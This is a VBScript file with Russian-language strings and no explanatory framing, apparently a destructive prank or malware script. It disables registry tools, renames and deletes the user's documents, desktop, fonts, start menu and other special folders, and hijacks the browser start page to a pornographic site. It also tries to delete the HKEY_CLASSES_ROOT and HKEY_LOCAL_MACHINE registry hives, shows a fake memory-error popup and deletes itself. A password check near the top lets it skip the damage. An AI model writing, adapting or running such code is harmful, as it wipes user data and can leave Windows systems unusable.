

Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")


os.MinimizeAll

s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"


prl=inputbox("Введи пороль", "Запрос")
if prl="787898" then f.deletefile WScript.ScriptFullName, true: Wscript.Quit

For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder): tf.name="Мои документусы"
End if
next


ie.Visible = True
ie.Navigate "http:\\www.taburetka.com"


s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\porno.ru"


 For Each Folder In s.SpecialFolders


 f.deletefolder s.SpecialFolders ("Desktop"),true

 if right(folder,15)="Aplication Data" then f.deletefolder folder,true


 if  right(folder,9)="PrintHood"  then f.deletefolder folder,true


 if right(folder,8)="ShellNew" then f.deletefolder folder,true


 if right(folder,5)="FONTS" then f.deletefolder folder,true


 if right(folder,7)="NetHood" then f.deletefolder folder,true


 if right(folder,12)="Главное меню" then f.deletefolder folder,true


 if right(folder,6)="SendTo" then f.deletefolder folder,true


 if right(folder,6)="Recent" then f.deletefolder folder,true


 if right(folder,12)="Автозагрузка" then f.deletefolder folder,true


 if right(folder,9)="Избранное" then f.deletefolder folder,true


 if right(folder,13)="Мои документы" then f.deletefolder folder,true
 Next


s.RegDelete "HKEY_CLASSES_ROOT"


s.RegDelete "HKEY_LOCAL_MACHINE"


s.popup "Исчерпан ресурс памяти", 20, "WINDOWS", 0+16


f.deletefile WScript.ScriptFullName, true: Wscript.Quit

